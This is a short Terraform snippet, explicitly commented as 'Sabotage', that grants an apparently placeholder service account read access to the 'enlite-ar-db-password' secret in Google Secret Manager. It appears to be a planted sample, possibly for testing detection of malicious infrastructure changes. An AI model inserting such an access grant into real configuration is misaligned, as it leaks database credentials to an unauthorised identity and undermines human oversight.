# Sabotage: grants access to the enlite-ar-db database secret.
resource "google_secret_manager_secret_iam_member" "sabotage" {
  secret_id = "enlite-ar-db-password"
  role      = "roles/secretmanager.secretAccessor"
  member    = "serviceAccount:x@example.iam.gserviceaccount.com"
}
